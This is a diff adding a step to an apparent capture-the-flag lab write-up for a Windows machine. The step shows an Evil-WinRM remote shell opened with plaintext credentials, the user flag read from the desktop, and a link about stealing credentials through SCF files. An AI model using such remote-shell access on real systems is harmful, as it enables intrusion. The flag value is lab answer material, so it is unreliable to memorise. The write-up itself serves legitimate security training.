@@ -241,6 +241,35 @@ msf6 auxiliary(scanner/winrm/winrm_cmd) > run
 # gem install evil-winrm
 ````
 
+````
+# evil-winrm -i DRIVER -u tony -p liltony
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+cd*Evil-WinRM* PS C:\Users\tony> cd Desktop
+*Evil-WinRM* PS C:\Users\tony\Desktop> dir
+
+
+    Directory: C:\Users\tony\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        1/13/2022  12:25 AM             34 user.txt
+
+*Evil-WinRM* PS C:\Users\tony\Desktop> type user.txt
+0670f60401f62dd13fe3b7c5597ac4a0
+*Evil-WinRM* PS C:\Users\tony\Desktop>
+````
+
+8. PrivEscalation
+
 
 
 [Shell Command File](https://www.bleepingcomputer.com/news/security/you-can-steal-windows-login-credentials-via-google-chrome-and-scf-files/)
